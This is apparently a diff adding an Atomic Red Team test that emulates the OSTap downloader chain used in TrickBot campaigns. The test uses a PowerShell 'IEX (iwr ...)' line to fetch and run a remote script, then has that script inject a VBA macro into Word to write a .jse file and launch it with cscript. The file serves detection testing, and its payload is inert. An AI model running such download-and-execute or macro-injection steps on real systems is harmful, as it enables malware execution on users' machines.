@@ -1,0 +1,18 @@
+#TechniqueName: User Execution: Malicious File
+#AtomicTestName: OSTap Style Macro Execution
+#Description: This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. Upon execution, the .jse file launches wscript.exe.&Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.&This is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns.&References:&  https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader&
+#Language: ps1
+
+#get_prereq_commands
+Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+
+
+#commands
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+$macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe C:\Users\Public\art.jse`"`n"
+Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"
+
+
+#cleanup_commands
+Remove-Item C:\Users\Public\art.jse -ErrorAction Ignore
+
